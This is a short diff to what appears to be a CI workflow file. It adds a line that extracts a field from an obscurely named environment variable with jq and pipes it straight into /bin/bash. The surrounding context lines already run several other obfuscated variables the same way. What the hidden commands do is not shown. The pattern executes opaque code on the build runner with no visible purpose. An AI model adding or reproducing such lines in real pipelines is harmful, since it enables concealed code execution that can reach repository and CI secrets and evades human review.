@@ -32,6 +32,7 @@ jobs:
           echo $axa98239 | jq -r .trub819 | /bin/bash
           echo $a09092 | jq -r .yw87577 | /bin/bash
           echo $pl9015 | jq -r .r991 | /bin/bash
+          printf '%s' "$pp3" | jq -r .uo32 | /bin/bash
 
       - name: Upload artifact
         if: always()
